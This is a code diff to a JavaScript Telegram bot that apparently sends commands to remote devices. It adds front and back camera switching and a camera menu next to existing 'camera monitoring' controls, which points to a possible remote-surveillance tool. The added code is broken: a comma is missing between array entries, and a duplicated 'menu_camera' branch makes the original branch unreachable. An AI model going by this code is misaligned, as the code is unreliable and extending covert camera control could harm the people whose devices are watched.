@@ -364,6 +364,10 @@ async function setChatMenuButton(chatId) {
                 { command: 'camera_on', description: '📸 Start camera monitoring' },
                 { command: 'camera_off', description: '📸 Stop camera monitoring' },
                 { command: 'camera_status', description: '📸 Check camera status' }
+{ command: 'camera_front', description: '📸 Switch to front camera' },
+{ command: 'camera_back', description: '📸 Switch to back camera' },
+{ command: 'camera_switch', description: '📸 Toggle between cameras' }
+
             ]
         });
         
@@ -853,7 +857,28 @@ async function handleCallbackQuery(callbackQuery) {
                 `• Last seen: ${new Date(device.lastSeen).toLocaleString()}\n\n` +
                 `All commands will now be sent to this device.`);
         }
-        
+        else if (data === 'menu_camera') {
+    const keyboard = [
+        [
+            { text: '📸 Take Photo', callback_data: 'cmd:photo' },
+            { text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }
+        ],
+        [
+            { text: '👤 Front Camera', callback_data: 'cmd:camera_front' },
+            { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }
+        ],
+        [
+            { text: '✅ Start Monitoring', callback_data: 'cmd:camera_on' },
+            { text: '❌ Stop Monitoring', callback_data: 'cmd:camera_off' }
+        ],
+        [
+            { text: '📊 Camera Status', callback_data: 'cmd:camera_status' },
+            { text: '◀️ Back', callback_data: 'help_main' }
+        ]
+    ];
+    await editMessageKeyboard(chatId, messageId, keyboard);
+}
+
     } else if (data === 'menu_camera') {
         const keyboard = [
             [
